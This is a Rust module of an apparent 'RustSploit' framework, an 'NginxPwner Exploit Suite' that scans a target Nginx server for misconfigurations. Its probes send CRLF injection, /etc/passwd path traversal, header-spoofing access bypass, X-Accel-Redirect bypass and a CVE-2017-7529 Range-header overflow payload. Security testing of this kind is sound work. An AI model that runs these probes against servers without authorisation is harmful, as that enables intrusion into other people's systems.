use anyhow::{Context, Result};
use colored::*;
use reqwest::{Client, StatusCode};
use std::fs::File;
use std::io::Write;
use std::time::Duration;

/// NginxPwner Exploit Suite
/// 
/// Ports functionality from https://github.com/stark0de/nginxpwner
/// Checks for common Nginx misconfigurations and vulnerabilities.
pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║                 NginxPwner Exploit Suite                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!("{}", format!("[*] Target: {}", target).yellow());

    // Normalize target
    let target_url = crate::utils::normalize_target(target)?;
    
    // Ensure no trailing slash for consistency in string building
    let base_url = target_url.trim_end_matches('/');

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none()) // We want to inspect redirects manually sometimes
        .build()
        .context("Failed to build HTTP client")?;

    let mut findings = Vec::new();

    println!("{}", "[*] Starting scan...".cyan());

    // 1. Version Check
    check_version(&client, base_url, &mut findings).await;

    // 2. CRLF Injection
    check_crlf(&client, base_url, &mut findings).await;

    // 3. PURGE Method
    check_purge(&client, base_url, &mut findings).await;

    // 4. Variable Leakage
    check_variable_leak(&client, base_url, &mut findings).await;

    // 5. Merge Slashes / Path Traversal
    check_merge_slashes(&client, base_url, &mut findings).await;

    // 6. Hop-by-Hop Header Bypass (IP Spoofing)
    check_headers_bypass(&client, base_url, &mut findings).await;

    // 7. CVE-2017-7529 (Integer Overflow)
    check_integer_overflow(&client, base_url, &mut findings).await;

    // 8. Alias Traversal (Kyubi logic)
    check_alias_traversal(&client, base_url, &mut findings).await;

    // 9. PHP Detection
    check_php(&client, base_url, &mut findings).await;

    // 10. X-Accel-Redirect Bypass
    check_x_accel_redirect(&client, base_url, &mut findings).await;

    // 11. Raw Backend Reading & Source Disclosure
    check_raw_backend_reading(&client, base_url, &mut findings).await;

    // 12. Manual Check Suggestions (Redis, etc)
    print_manual_suggestions();

    // Report Findings
    println!("\n{}", "═══ Scan Results ═══".cyan().bold());
    if findings.is_empty() {
        println!("{}", "No significant vulnerabilities found.".green());
    } else {
        for finding in &findings {
            println!("{}", finding);
        }
        
        // Save to file
        save_results(target, &findings)?;
    }

    Ok(())
}

async fn check_version(client: &Client, url: &str, findings: &mut Vec<String>) {
    if let Ok(resp) = client.get(url).send().await {
        if let Some(server) = resp.headers().get("Server") {
            if let Ok(s) = server.to_str() {
                println!("[*] Server Header: {}", s.blue());
                if s.contains('/') && s.chars().any(|c| c.is_numeric()) {
                    findings.push(format!("Version Disclosure: Server header reveals version '{}'. Check if outdated.", s));
                }
            }
        }
    }
}

async fn check_crlf(client: &Client, url: &str, findings: &mut Vec<String>) {
    let payload = "%0d%0aDetectify:%20crlf";
    let target = format!("{}/{}", url, payload);
    
    if let Ok(resp) = client.get(&target).send().await {
        if resp.headers().contains_key("Detectify") {
            let msg = format!("CRLF Injection found! URI: {} reflects 'Detectify' header.", target);
            println!("{}", format!("[!] {}", msg).red().bold());
            findings.push(msg);
        }
    }
}

async fn check_purge(client: &Client, url: &str, findings: &mut Vec<String>) {
    let target = format!("{}/test_purge", url);
    if let Ok(resp) = client.request(reqwest::Method::from_bytes(b"PURGE").unwrap(), &target).send().await {
        if resp.status().as_u16() == 204 {
            let msg = format!("PURGE method is enabled on {}. This might allow cache poisoning/clearing.", target);
            println!("{}", format!("[!] {}", msg).red().bold());
            findings.push(msg);
         }
    }
}

async fn check_variable_leak(client: &Client, url: &str, findings: &mut Vec<String>) {
    let target = format!("{}/foo$http_referer", url);
    let secret = "RUSTSPLOIT_SECRET_REF";
    
    if let Ok(resp) = client.get(&target).header("Referer", secret).send().await {
        if let Ok(text) = resp.text().await {
            if text.contains(secret) {
                let msg = format!("Variable Leakage: '$http_referer' is reflected in response from {}", target);
                println!("{}", format!("[!] {}", msg).red().bold());
                findings.push(msg);
            }
        }
    }
}

async fn check_merge_slashes(client: &Client, url: &str, findings: &mut Vec<String>) {
    // Check path traversal via merge_slashes bypass
    let payloads = vec![
        "///../../../../../etc/passwd",
        "//////../../../../../../etc/passwd",
        "///../../../../../win.ini",
    ];

    for p in payloads {
        let target = format!("{}{}", url, p);
        if let Ok(resp) = client.get(&target).send().await {
            if resp.status() == StatusCode::OK {
                 let msg = format!("Possible Path Traversal via merge_slashes bypass: {}", target);
                 println!("{}", format!("[!] {}", msg).red().bold());
                 findings.push(msg);
                 break; 
            }
        }
    }
}

async fn check_headers_bypass(client: &Client, url: &str, findings: &mut Vec<String>) {
    let headers_list = vec![
        "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "Client-IP", "X-Client-IP",
        "Proxy-Host", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-Host", "Base-Url", "Http-Url"
    ];
    let ips = vec!["127.0.0.1", "localhost", "192.168.1.1", "10.0.0.1"];

    let baseline = client.get(format!("{}/", url)).send().await;
    let baseline_len = match baseline {
        Ok(ref r) => r.content_length().unwrap_or(0),
        Err(_) => return,
    };
    let baseline_status = match baseline {
        Ok(ref r) => r.status(),
        Err(_) => return,
    };

    for header in headers_list {
        for ip in &ips {
             if let Ok(resp) = client.get(format!("{}/", url)).header(header, *ip).send().await {
                 let len = resp.content_length().unwrap_or(0);
                 if resp.status() != baseline_status || (len as i64 - baseline_len as i64).abs() > 50 {
                     let msg = format!("Response difference detected with header {}: {}. Possible IP restriction bypass.", header, ip);
                     println!("{}", format!("[?] {}", msg).yellow());
                     findings.push(msg);
                 }
             }
        }
    }
}

async fn check_integer_overflow(client: &Client, url: &str, findings: &mut Vec<String>) {
    if let Ok(resp) = client.get(url).send().await {
        let content_len = resp.content_length().unwrap_or(0);
        if content_len > 0 {
             let bytes_len = content_len + 623;
             let range_val = format!("bytes=-{},-9223372036854{}", bytes_len, 776000 - (bytes_len as i64));
             
             if let Ok(vuln_resp) = client.get(url).header("Range", range_val).send().await {
                 if vuln_resp.status() == StatusCode::PARTIAL_CONTENT || vuln_resp.headers().contains_key("Content-Range") {
                      let msg = format!("Vulnerable to CVE-2017-7529 (Integer Overflow). Target: {}", url);
                      println!("{}", format!("[!] {}", msg).red().bold());
                      findings.push(msg);
                 }
             }
        }
    }
}

async fn check_alias_traversal(client: &Client, url: &str, findings: &mut Vec<String>) {
    // "Off-by-slash" alias traversal
    // We try common static paths and paths often found in Nginx configs.
    let paths = vec![
        "static", "assets", "img", "images", "js", "css", "media", "uploads", "icons", "public",
        "conf", "backup", "db", "database", "admin", "private", "api", "download", "files"
    ];
    
    for path in paths {
        let traversal = format!("{}{}../", url, path);
        if let Ok(resp) = client.get(&traversal).send().await {
            if resp.status() == StatusCode::FORBIDDEN || resp.status() == StatusCode::OK {
                  // Eliminate false positives by comparing with 404
                  let garbage = format!("{}/garbage_{}", url, path);
                  let r404 = client.get(&garbage).send().await;
                  let r404_status = r404.map(|r| r.status()).unwrap_or(StatusCode::NOT_FOUND);
                  
                  if resp.status() != r404_status {
                       let msg = format!("Possible Alias Traversal key found at: {}. Status: {}", traversal, resp.status());
                       println!("{}", format!("[?] {}", msg).yellow());
                       findings.push(msg);
                  }
            }
        }
    }
}

async fn check_raw_backend_reading(client: &Client, url: &str, findings: &mut Vec<String>) {
    // Test for Raw Backend Reading via specific verb/header
    // Python script suggests: GET /? XTTP/1.1\nHost: 127.0.0.1\nConnection: close
    // We try to look for Nginx Status or Source Disclosure as a proxy for this class of misconfig coverage.
    
    // Check for Nginx Status
    let status_paths = vec!["nginx_status", "stub_status", "status", "nginx-status"];
    for p in status_paths {
        if let Ok(resp) = client.get(format!("{}/{}", url, p)).send().await {
            if resp.status() == StatusCode::OK {
                if let Ok(text) = resp.text().await {
                    if text.contains("Active connections") || text.contains("server accepts handled requests") {
                        let msg = format!("Nginx Status information found at {}/{}", url, p);
                        println!("{}", format!("[!] {}", msg).red().bold());
                        findings.push(msg);
                    }
                }
            }
        }
    }

    // Check if root reveals nginx.conf (Source Disclosure)
    if let Ok(resp) = client.get(format!("{}/", url)).send().await {
         if let Ok(text) = resp.text().await {
             if text.contains("worker_processes") && text.contains("http {") {
                 let msg = format!("Root directory reveals nginx.conf content! Missing root directive?");
                 println!("{}", format!("[!] {}", msg).red().bold());
                 findings.push(msg);
             }
         }
    }
}

async fn check_php(client: &Client, url: &str, findings: &mut Vec<String>) {
    let mut is_php = false;
    
    // Check 1: /index.php
    if let Ok(resp) = client.get(format!("{}/index.php", url)).send().await {
        if resp.status() == StatusCode::OK {
            is_php = true;
        }
    }

    // Check 2: Cookies and Headers
    if let Ok(resp) = client.get(url).send().await {
        if resp.headers().iter().any(|(k, v)| k == "set-cookie" && v.to_str().unwrap_or("").contains("PHPSESSID")) {
             is_php = true;
        }
        if let Some(s) = resp.headers().get("Server") {
            if s.to_str().unwrap_or("").to_lowercase().contains("php") {
                is_php = true;
            }
        }
        if let Some(x) = resp.headers().get("X-Powered-By") {
            if x.to_str().unwrap_or("").to_lowercase().contains("php") {
                is_php = true;
            }
        }
    }

    if is_php {
        println!("{}", "[+] Target seems to be using PHP.".green());
        findings.push("Technology Detection: PHP detected.".to_string());
        println!("{}", "[?] If PHP is used, check for configuration errors: https://book.hacktricks.xyz/pentesting/pentesting-web/nginx#script_name".cyan());
        println!("{}", "[?] Also check CVE-2019-11043.".cyan());
    }
}

async fn check_x_accel_redirect(client: &Client, url: &str, findings: &mut Vec<String>) {
    // We can't access "existingfolderpathlist" from logic easily as arg, 
    // so we use a common list of sensitive/likely protected paths to test bypass on.
    let sensitive_paths = vec![
        "admin", "private", "conf", "config", "backup", "db", "logs", "internal", "api", "console"
    ];

    println!("{}", "[?] Testing X-Accel-Redirect bypass on common paths...".cyan());

    for path in sensitive_paths {
        let full_path = format!("{}/{}", url, path);
        if let Ok(resp) = client.get(&full_path).send().await {
            // If we get 401/403, we try to bypass
            if resp.status() == StatusCode::FORBIDDEN || resp.status() == StatusCode::UNAUTHORIZED {
                 // Try X-Accel-Redirect
                 let bypass_header = format!("/{}", path);
                 let random_path = format!("{}/accel_bypass_test_rustsploit", url);
                 
                 if let Ok(bypass) = client.get(&random_path).header("X-Accel-Redirect", bypass_header).send().await {
                     if bypass.status() != resp.status() && bypass.status().as_u16() < 400 {
                          let msg = format!("Possible X-Accel-Redirect bypass found! Path: {} returned {} directly, but {} with header.", 
                                            path, resp.status(), bypass.status());
                          println!("{}", format!("[!] {}", msg).red().bold());
                          findings.push(msg);
                     }
                 }
            }
        }
    }
}

fn print_manual_suggestions() {
    println!("\n{}", "[*] Manual Check Suggestions:".yellow().bold());
    println!("{}", "1. Raw Backend Reading: Test with 'GET /? XTTP/1.1\\nHost: 127.0.0.1\\nConnection: close'".cyan());
    println!("{}", "2. Redis: If site uses Redis, check for misconfigurations (see labs.detectify.com)".cyan());
    println!("{}", "3. CORS: Check for bad regexes with Corsy.".cyan());
    println!("{}", "4. Request Smuggling: Check for typical HTTP smuggling issues.".cyan());
}

fn save_results(target: &str, findings: &[String]) -> Result<()> {
    // Sanitize target for filename
    let safe_target = target.replace("http://", "").replace("https://", "").replace("/", "_").replace(":", "_");
    let filename = format!("nginx_pwner_results_{}.txt", safe_target);
    
    let mut file = File::create(&filename).context("Failed to create result file")?;
    
    writeln!(file, "NginxPwner Scan Results for {}", target)?;
    writeln!(file, "Timestamp: {}", chrono::Local::now())?;
    writeln!(file, "----------------------------------------")?;
    
    for f in findings {
        writeln!(file, "{}", f)?;
    }
    
    println!("\n[+] Results saved to {}", filename.green());
    Ok(())
}
